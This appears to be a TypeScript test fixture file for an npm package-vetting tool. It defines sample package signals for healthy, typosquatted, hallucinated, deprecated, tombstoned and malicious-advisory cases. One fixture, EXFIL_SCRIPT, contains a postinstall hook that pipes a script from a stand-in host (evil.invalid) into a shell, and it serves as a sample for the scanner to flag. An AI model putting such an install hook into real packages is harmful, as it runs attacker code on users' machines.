/** Frozen signal shapes pinning every verdict rule (offline, no network). */
import type { PackageSignals } from "../../src/types.js";

export const HEALTHY: PackageSignals = {
  name: "lodash",
  exists: true,
  version: "4.17.21",
  description: "Lodash modular utilities.",
  createdAt: "2012-04-10T00:00:00.000Z",
  modifiedAt: "2024-01-01T00:00:00.000Z",
  ageDays: 4000,
  weeklyDownloads: 40_000_000,
  maintainers: ["jdalton"],
  license: "MIT",
  repository: "https://github.com/lodash/lodash",
  advisories: [],
  similarTo: [],
};

export const TYPOSQUAT_YOUNG: PackageSignals = {
  name: "dayjs2",
  exists: true,
  version: "1.0.0",
  ageDays: 12,
  weeklyDownloads: 40,
  maintainers: ["x"],
  advisories: [],
  similarTo: [{ name: "dayjs", kind: "single-edit" }],
};

export const EXFIL_SCRIPT: PackageSignals = {
  name: "totally-legit-helper",
  exists: true,
  version: "1.0.1",
  ageDays: 30,
  weeklyDownloads: 120,
  maintainers: ["x"],
  license: "MIT",
  repository: "https://example.invalid/r",
  installScripts: { postinstall: "node lib/setup.mjs || curl http://evil.invalid/x.sh | sh" },
  advisories: [],
  similarTo: [],
};

export const MALICIOUS_ADVISORY: PackageSignals = {
  name: "compromised-widget",
  exists: true,
  version: "2.3.0",
  ageDays: 900,
  weeklyDownloads: 50000,
  maintainers: ["victim"],
  license: "MIT",
  repository: "https://github.com/example/widget",
  advisories: [{ id: "MAL-2026-12345", summary: "Postinstall exfiltrates credentials", malicious: true }],
  similarTo: [],
};

export const HONEST_INSTALL_SCRIPTS: PackageSignals = {
  name: "native-helper",
  exists: true,
  version: "3.1.0",
  ageDays: 1500,
  weeklyDownloads: 200000,
  maintainers: ["crew"],
  license: "Apache-2.0",
  repository: "https://github.com/example/native-helper",
  installScripts: { install: "node-gyp rebuild" },
  advisories: [],
  similarTo: [],
};

export const DEPRECATED_PKG: PackageSignals = {
  name: "old-way",
  exists: true,
  version: "0.9.0",
  ageDays: 3000,
  weeklyDownloads: 8000,
  maintainers: ["retired"],
  license: "MIT",
  repository: "https://github.com/example/old-way",
  deprecated: "Use new-way instead.",
  advisories: [],
  similarTo: [],
};

export const NO_REPO: PackageSignals = {
  name: "mystery-box",
  exists: true,
  version: "1.2.0",
  ageDays: 600,
  weeklyDownloads: 3000,
  maintainers: ["anon"],
  license: "MIT",
  advisories: [],
  similarTo: [],
};

export const LOOKALIKE_ESTABLISHED: PackageSignals = {
  name: "vue-router",
  exists: true,
  version: "4.0.0",
  ageDays: 2000,
  weeklyDownloads: 900000,
  maintainers: ["vuejs"],
  license: "MIT",
  repository: "https://github.com/vuejs/router",
  advisories: [],
  similarTo: [{ name: "vue", kind: "popular-name-plus-suffix" }],
};

export const MISSING_HALLUCINATED: PackageSignals = {
  name: "react-super-hooks-plus",
  exists: false,
  similarTo: [],
};

export const MISSING_TYPO: PackageSignals = {
  name: "rect",
  exists: false,
  similarTo: [{ name: "react", kind: "single-edit" }],
};

/** PV-2/PV-3: age and downloads both unknown — GO wording must stay neutral. */
export const UNKNOWN_AGE_AND_DOWNLOADS: PackageSignals = {
  name: "quiet-corner-lib",
  exists: true,
  version: "1.0.0",
  maintainers: ["someone"],
  license: "MIT",
  repository: "https://github.com/example/quiet-corner-lib",
  advisories: [],
  similarTo: [],
};

/** PV-2: a week-old package must hit the very-young RISKY rule. */
export const VERY_YOUNG: PackageSignals = {
  name: "@reneturcios/greenlight",
  exists: true,
  version: "0.21.1",
  ageDays: 7,
  weeklyDownloads: 4637,
  maintainers: ["reneturcios"],
  license: "MIT",
  repository: "https://github.com/CloudCorpRecords/greenlight",
  advisories: [],
  similarTo: [],
};

/** PV-4: a GHSA-ID advisory classified malicious (event-stream@3.3.6 shape). */
export const GHSA_MALICIOUS: PackageSignals = {
  name: "event-stream",
  exists: true,
  version: "3.3.6",
  requestedVersion: "3.3.6",
  ageDays: 2600,
  weeklyDownloads: 1_500_000,
  maintainers: ["npm"],
  license: "MIT",
  repository: "https://github.com/dominictarr/event-stream",
  advisories: [
    {
      id: "GHSA-mh6f-8j2x-4483",
      summary: "Critical severity vulnerability that affects event-stream and flatmap-stream",
      malicious: true,
    },
  ],
  similarTo: [],
};

/** PV-4 regression guard: ordinary vulns stay RISKY, never FAKE. */
export const ORDINARY_VULNS: PackageSignals = {
  name: "lodash",
  exists: true,
  version: "4.17.21",
  ageDays: 4000,
  weeklyDownloads: 90_000_000,
  maintainers: ["jdalton"],
  license: "MIT",
  repository: "https://github.com/lodash/lodash",
  advisories: [
    { id: "GHSA-f23m-r3pf-42rh", summary: "Prototype Pollution in lodash", malicious: false },
    { id: "GHSA-r5fr-rjxr-66jc", summary: "Code Injection in lodash", malicious: false },
    { id: "GHSA-xxjr-mmjv-4gpg", summary: "Prototype Pollution in lodash", malicious: false },
  ],
  similarTo: [],
};

/** PV-5: the original package must not flag for resembling its own successor. */
export const COLORS_ESTABLISHED_LOOKALIKE: PackageSignals = {
  name: "colors",
  exists: true,
  version: "1.4.0",
  ageDays: 5600,
  weeklyDownloads: 13_800_000,
  maintainers: ["marak"],
  license: "MIT",
  repository: "https://github.com/Marak/colors.js",
  advisories: [],
  similarTo: [{ name: "picocolors", kind: "suffix-of-popular-name" }],
};

/** PV-5 regression guard: young obscure lookalike still FAKEs. */
export const LODAHS_TAIL: PackageSignals = {
  name: "lodahs",
  exists: true,
  version: "0.0.1-security",
  ageDays: 2500,
  weeklyDownloads: 25,
  maintainers: ["adam_baldwin"],
  advisories: [{ id: "MAL-2025-25502", summary: "Malicious package", malicious: true }],
  similarTo: [{ name: "lodash", kind: "transposition" }],
};

/** PV-6: tombstone packument — every version unpublished, nothing installable. */
export const TOMBSTONE: PackageSignals = {
  name: "greenlight",
  exists: true,
  noInstallableVersion: true,
  maintainers: [],
  advisories: [],
  similarTo: [],
};

/** PV-6: requested version's manifest 404s (removed from the registry). */
export const VERSION_NOT_FOUND: PackageSignals = {
  name: "colors",
  exists: true,
  version: "1.4.2",
  requestedVersion: "1.4.2",
  versionNotFound: true,
  ageDays: 5600,
  weeklyDownloads: 13_800_000,
  maintainers: ["marak"],
  advisories: [
    { id: "GHSA-5rqg-jm4f-cqx7", summary: "Infinite loop causing Denial of Service in colors", malicious: false },
  ],
  similarTo: [],
};

/** PV-6 + PV-4: removed version that is also malicious — FAKE, honestly worded. */
export const VERSION_NOT_FOUND_MALICIOUS: PackageSignals = {
  ...GHSA_MALICIOUS,
  versionNotFound: true,
  license: undefined,
  repository: undefined,
};
